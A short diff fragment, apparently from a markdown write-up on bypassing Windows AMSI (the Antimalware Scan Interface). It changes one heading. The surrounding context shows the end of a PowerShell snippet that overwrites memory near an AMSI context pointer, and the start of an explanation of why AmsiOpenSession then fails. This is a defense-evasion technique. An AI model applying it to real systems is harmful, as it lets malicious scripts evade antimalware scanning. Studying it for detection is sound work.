@@ -27,7 +27,7 @@ $buf = New-Object byte[](8);
 $ptr= [System.IntPtr]::Add([System.IntPtr]$g, 0x8);
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
 ```
-# Whats actually happening here? (Win10 Version)
+# Whats actually happening here? (Very Short Win10 Version)
 AmsioOpenSession compares the first 4 bytes of amsiContext to the HEX value equivalent of 'AMSI'. If this operation fails it jumps to the code block 
 ```mov eax, 80070057h``` 
 \
